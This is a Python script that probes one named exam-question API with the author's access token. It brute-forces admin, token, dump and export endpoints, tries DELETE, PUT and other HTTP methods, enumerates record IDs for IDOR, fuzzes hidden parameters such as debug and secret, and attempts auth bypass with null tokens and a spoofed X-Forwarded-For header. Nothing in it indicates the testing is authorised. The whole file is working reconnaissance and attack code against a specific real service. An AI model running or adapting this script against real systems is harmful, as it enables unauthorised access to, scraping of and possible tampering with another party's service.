import requests
import time
import os
from dotenv import load_dotenv

load_dotenv()

BASE = "https://questions.aloc.com.ng"
TOKEN = os.getenv("API_KEY_1")
HEADERS = {"Accept": "application/json", "AccessToken": TOKEN}

def req(label, url, headers=None, method="GET"):
    try:
        r = requests.request(method, url, headers=headers or HEADERS, timeout=8)
        flag = "HIT >>>" if r.status_code not in [404, 406, 403, 301, 302] else "     "
        print(f"{flag} [{r.status_code}] {label}")
        if flag.strip():
            print(f"         {r.text[:200]}")
        return r
    except requests.exceptions.Timeout:
        print(f"  TIMEOUT  {label}")
        return None
    except Exception as e:
        print(f"  ERROR    {label} => {e}")
        return None

print("\n=== 1. ENDPOINT BRUTE FORCE ===")
endpoints = [
    "/api/v2/questions", "/api/v2/all", "/api/v2/dump", "/api/v2/export",
    "/api/v3/q/5", "/api/v2/q", "/api/v2/subjects", "/api/v2/stats",
    "/api/v2/admin", "/api/v2/users", "/api/v2/token", "/api/v2/keys",
    "/admin", "/dashboard", "/api/docs", "/swagger", "/swagger.json",
    "/api/v1/q/5", "/api/v2/q/5", "/api/v2/q/10", "/api/v2/q/50",
    "/api/v2/q/5?subject=mathematics&all=1",
    "/api/v2/q/5?subject=mathematics&export=1",
    "/api/v2/q/5?subject=mathematics&paginate=0",
    "/api/v2/q/5?subject=mathematics&limit=9999",
    "/api/v2/q/5?subject=mathematics&format=csv",
]
for ep in endpoints:
    req(ep, BASE + ep)
    time.sleep(0.4)

print("\n=== 2. HTTP METHOD BRUTE FORCE ===")
for method in ["POST", "PUT", "DELETE", "PATCH", "OPTIONS"]:
    req(f"{method} /api/v2/q/5", f"{BASE}/api/v2/q/5?subject=mathematics", method=method)
    time.sleep(0.4)

print("\n=== 3. ID ENUMERATION (IDOR) ===")
found = []
for qid in range(1, 50):
    r = req(f"id={qid}", f"{BASE}/api/v2/q/1?subject=mathematics&id={qid}")
    if r and r.status_code == 200:
        try:
            ids = [q["id"] for q in r.json().get("data", [])]
            if qid in ids:
                found.append(qid)
                print(f"         direct ID fetch works for id={qid}")
        except:
            pass
    time.sleep(0.3)
print(f"  Direct ID fetch worked for: {found if found else 'none'}")

print("\n=== 4. HIDDEN PARAM FUZZ ===")
params = ["token", "key", "apikey", "secret", "debug", "admin",
          "raw", "full", "all", "dump", "page", "offset", "cursor"]
for p in params:
    req(f"param={p}", f"{BASE}/api/v2/q/5?subject=mathematics&{p}=1")
    time.sleep(0.3)

print("\n=== 5. AUTH BYPASS ATTEMPTS ===")
bypass_headers = [
    {"Accept": "application/json", "AccessToken": "null"},
    {"Accept": "application/json", "AccessToken": "undefined"},
    {"Accept": "application/json", "AccessToken": "0"},
    {"Accept": "application/json", "X-AccessToken": TOKEN},
    {"Accept": "application/json", "Authorization": f"Bearer {TOKEN}"},
    {"Accept": "application/json", "AccessToken": TOKEN, "X-Forwarded-For": "127.0.0.1"},
]
for h in bypass_headers:
    label = list(h.items())[-1]
    req(f"auth bypass: {label}", f"{BASE}/api/v2/q/5?subject=mathematics", headers=h)
    time.sleep(0.4)

print("\n=== 6. SUBJECT ENUMERATION ===")
extra_subjects = ["history", "currentaffairs", "insurance", "englishlit",
                  "civiledu", "crk", "irk", "waec", "neco", "french",
                  "music", "arts", "technical-drawing", "data-processing"]
for s in extra_subjects:
    r = req(f"subject={s}", f"{BASE}/api/v2/q/5?subject={s}")
    if r and r.status_code == 200:
        try:
            count = len(r.json().get("data", []))
            print(f"         returned {count} questions")
        except:
            pass
    time.sleep(0.4)

print("\nDone.")
